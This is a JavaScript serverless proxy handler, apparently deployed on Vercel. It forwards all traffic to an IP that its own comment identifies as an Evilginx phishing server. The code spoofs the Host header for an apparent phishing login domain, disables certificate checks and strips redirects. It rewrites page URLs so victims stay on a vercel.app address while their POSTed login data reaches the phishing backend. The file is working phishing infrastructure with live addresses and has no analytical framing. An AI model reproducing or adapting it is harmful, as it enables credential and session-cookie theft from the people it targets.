import https from 'https';

export default async function handler(req, res) {
  const targetHost = '185.165.171.174'; // Your Evilginx server IP
  const targetPath = req.url;

  // Critical headers - ensures Evilginx processes the request correctly
  const headers = {
    'Host': 'login.espeharete.top',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || '127.0.0.1',
    'X-Real-IP': req.headers['x-real-ip'] || req.ip || '127.0.0.1'
  };

  const options = {
    hostname: targetHost,
    port: 443,
    path: targetPath,
    method: req.method,
    headers: headers,
    rejectUnauthorized: false,
    timeout: 15000
  };

  return new Promise((resolve) => {
    const proxyReq = https.request(options, (proxyRes) => {
      // Filter and modify response headers to maintain Vercel URL
      const responseHeaders = { ...proxyRes.headers };
      
      // Remove headers that might cause redirects
      delete responseHeaders['location'];
      delete responseHeaders['content-length'];
      delete responseHeaders['transfer-encoding'];
      
      // Process HTML content to rewrite URLs
      if (responseHeaders['content-type']?.includes('text/html')) {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          let body = Buffer.concat(chunks).toString();
          
          // Rewrite all URLs in the HTML to point back to your Vercel domain
          body = body.replace(
            /https:\/\/login\.espeharete\.top/g, 
            'https://aa-iido.vercel.app'
          );
          
          responseHeaders['content-length'] = Buffer.byteLength(body);
          res.writeHead(proxyRes.statusCode, responseHeaders);
          res.end(body);
          resolve();
        });
      } else {
        // For non-HTML content, just pipe it through
        res.writeHead(proxyRes.statusCode, responseHeaders);
        proxyRes.pipe(res);
        proxyRes.on('end', () => resolve());
      }
    });

    proxyReq.on('error', (err) => {
      console.error('Proxy error:', err);
      if (!res.headersSent) {
        res.status(502).send('Bad Gateway');
      }
      resolve();
    });

    proxyReq.on('timeout', () => {
      proxyReq.destroy();
      if (!res.headersSent) {
        res.status(504).send('Gateway Timeout');
      }
      resolve();
    });

    if (req.method === 'POST' || req.method === 'PUT') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }
  });
}
